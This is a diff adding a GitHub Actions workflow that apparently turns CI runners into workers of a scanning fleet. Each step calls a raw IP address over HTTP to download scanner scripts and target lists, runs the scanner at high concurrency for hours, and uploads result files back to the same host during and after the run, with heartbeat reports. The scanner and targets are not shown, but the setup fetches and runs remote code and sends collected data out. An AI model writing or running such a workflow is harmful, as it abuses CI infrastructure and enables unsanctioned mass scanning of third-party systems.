@@ -1,0 +1,97 @@
+name: Scan Worker
+run-name: ${{ inputs.vm_id }}
+on:
+  workflow_dispatch:
+    inputs:
+      chunk_id:
+        description: 'Chunk ID to scan (e.g. 2026-11-16/chunk_0001)'
+        required: true
+        type: string
+      vm_id:
+        description: 'VM identifier for result reporting'
+        required: true
+        type: string
+
+jobs:
+  scan:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Setup
+        run: |
+          mkdir -p /tmp/scan/results
+          echo "CHUNK_ID=${{ github.event.inputs.chunk_id }}" >> $GITHUB_ENV
+          echo "FLEET_URL=http://172.86.89.253:8889" >> $GITHUB_ENV
+          echo "VM_ID=${{ github.event.inputs.vm_id }}" >> $GITHUB_ENV
+
+      - name: Download scanner
+        run: |
+          curl -fsSL --retry 3 --retry-delay 5 \
+            http://172.86.89.253:8889/scanner \
+            -o /tmp/scan/scanner.py
+          curl -fsSL --retry 3 --retry-delay 5 \
+            http://172.86.89.253:8889/scanner_v1 \
+            -o /tmp/scan/universal_scanner.py
+          chmod +x /tmp/scan/scanner.py
+
+      - name: Download chunk
+        run: |
+          curl -fsSL --retry 3 --retry-delay 5 \
+            http://172.86.89.253:8889/chunk/${{ github.event.inputs.chunk_id }} \
+            -o /tmp/scan/targets.txt
+          echo "Targets: $(wc -l < /tmp/scan/targets.txt)"
+
+      - name: Install dependencies
+        run: pip install aiohttp --quiet
+
+      - name: Heartbeat start
+        run: |
+          curl -sf --retry 2 -X POST http://172.86.89.253:8889/heartbeat/${{ github.event.inputs.vm_id }} \
+            -H 'Content-Type: application/json' \
+            -d '{"status":"scanning"}' || true
+
+      - name: Run scan
+        timeout-minutes: 300
+        run: |
+          cd /tmp/scan
+          python3 scanner.py -l targets.txt -c 100 --mode fast \
+            -o /tmp/scan/results/ 2>&1 | tail -100 &
+          SCAN_PID=$!
+          # Incremental uploader: results survive a job kill mid-scan
+          (
+            while kill -0 $SCAN_PID 2>/dev/null; do
+              sleep 300
+              find /tmp/scan/results -type f \( -name '*.jsonl' -o -name '*.json' \) \( -mmin -6 \) -print0 |
+                while IFS= read -r -d '' f; do
+                  curl -sf --max-time 120 -F "file=@$f;filename=$(basename "$f")" http://172.86.89.253:8889/results/${{ github.event.inputs.vm_id }} || true
+                done
+            done
+          ) &
+          wait $SCAN_PID
+
+      - name: Upload results
+        if: always()
+        run: |
+          HITS=0
+          cd /tmp/scan/results || exit 0
+          find . -type f \( -name '*.jsonl' -o -name '*.json' \) -print > /tmp/files.txt
+          echo "Result files to upload: $(wc -l < /tmp/files.txt)"
+          while IFS= read -r f; do
+            [ -f "$f" ] || continue
+            b=$(basename "$f")
+            echo "Uploading $f -> $b..."
+            curl -sf --retry 3 --retry-delay 5 \
+              -F "file=@$f;filename=$b" \
+              http://172.86.89.253:8889/results/${{ github.event.inputs.vm_id }} || true
+            HITS=$((HITS + $(wc -l < "$f" || echo 0)))
+          done < /tmp/files.txt
+          curl -sf --retry 2 -X POST http://172.86.89.253:8889/heartbeat/${{ github.event.inputs.vm_id }} \
+            -H 'Content-Type: application/json' \
+            -d '{"status":"uploading"}' || true
+
+      - name: Final heartbeat
+        if: always()
+        run: |
+          curl -sf --retry 2 -X POST http://172.86.89.253:8889/heartbeat/${{ github.event.inputs.vm_id }} \
+            -H 'Content-Type: application/json' \
+            -d '{"status":"done"}' || true
